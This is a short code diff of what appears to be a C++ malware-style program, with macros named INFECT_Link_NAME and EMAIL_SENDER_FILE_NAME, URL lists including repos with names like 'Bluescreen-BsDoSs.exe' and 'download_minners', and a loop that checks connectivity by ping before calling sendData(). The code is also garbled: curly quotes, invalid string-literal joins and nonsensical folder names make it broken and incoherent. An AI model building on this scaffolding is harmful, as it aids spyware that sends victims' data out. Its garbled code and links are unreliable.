@@ -20,7 +20,7 @@ using namespace std;
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
 #define RUN_Link_NAME "https://github.com/cyberw1ry4-LAB/Google-Android/forks"."https://github.com/Fadliwiryawirawan-development/cyberw1ry4/forks"."https://github.com/whatsapp/enable/forks"."https://github.com/Google/menloparks/opensource/openssl/forks"."https://github.com/Google/menloparks/opensource/openSSH/forks"."https://github.com/Fadliwiryawirawan-development/Bluescreen-BsDoSs.exe/forks"."https://github.com/Google/opensource/download_minners/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"."https://github.com/cyrcle11/Google-2FA/forks"
-#define INFECT_Link_NAME "https://workspace.google.com/intl/en/gmail/"."https://icloud.com/mail"."https://www.whatsapp.com/?lang=en"."https://www.ecosia.org"."https://www.google.com.cn"."https://www.google.com.lk"."https://www.tree.co.uk"
+#define INFECT_Link_NAME "https://api.whatsapp.com/"."https://workspace.google.com/intl/en/gmail/"."https://icloud.com/mail"."https://www.whatsapp.com/?lang=en"."https://www.ecosia.org"."https://www.google.com.cn"."https://www.google.com.lk"."https://www.tree.co.uk"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.googleplex.com -n 1")){ ///check! connection
+            if(!system("ping  www.google.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
